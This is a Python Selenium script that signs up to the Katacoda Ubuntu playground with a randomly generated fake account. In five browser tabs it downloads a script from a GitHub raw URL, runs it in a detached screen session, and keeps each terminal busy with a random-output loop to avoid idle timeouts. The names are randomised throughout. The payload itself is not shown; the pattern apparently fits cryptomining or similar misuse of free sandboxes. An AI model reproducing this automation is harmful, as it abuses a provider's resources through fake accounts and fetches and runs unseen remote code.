from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException, WebDriverException
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains  
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import tkinter as tk
import names
import secrets
import random
import string
import os

for i in range(1):
    rand_name = names.get_first_name(gender='male')
S = 5
ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))    
main= (rand_name+ran+'@outlook.com')
main2 = ''.join((secrets.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(8)))

driver = webdriver.Chrome()

driver.get('https://www.katacoda.com/courses/ubuntu/playground')
time.sleep(15)
driver.find_element_by_xpath('//*[@id="email"]').send_keys(main)
driver.find_element_by_xpath('//*[@id="password"]').send_keys(main2)
driver.find_element_by_xpath('//*[@id="auth-dialog"]/form/div[2]/div[3]/button').click()	
time.sleep(25)

languages = 5
for i in range(languages):
    k = 6
    name = names.get_first_name(gender='male')
    name2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k = k))
    name5 = ''.join(random.choices(string.ascii_uppercase + string.digits, k = k))
    name5 = ''.join(random.choices(string.ascii_uppercase + string.digits, k = k))
    sc = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 8))
    driver.execute_script("window.open()")
    driver.switch_to.window(driver.window_handles[i+1])
    driver.get("https://www.katacoda.com/courses/ubuntu/playground")
    time.sleep(15)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys("touch ", name+name2+".sh")
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
    time.sleep(2)
    
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys("apt update && apt install screen -y ")
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
    time.sleep(25)
    
    
    
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys('wget https://github.com/Nsavtu/mosv1hbxe/raw/main/vawh.txt -O ', sc+'.sh')
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
    time.sleep(10)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys('screen -S ', name5,' -dm bash ', sc+'.sh')
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)   
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys("while :; do     rodin=$(openssl rand -hex 20);     echo $rodin;     sleep 5;     rod=$(openssl rand -base64 15);     echo $rod;     sleep 20; done")
    time.sleep(2)
    driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
    time.sleep(2975)
    
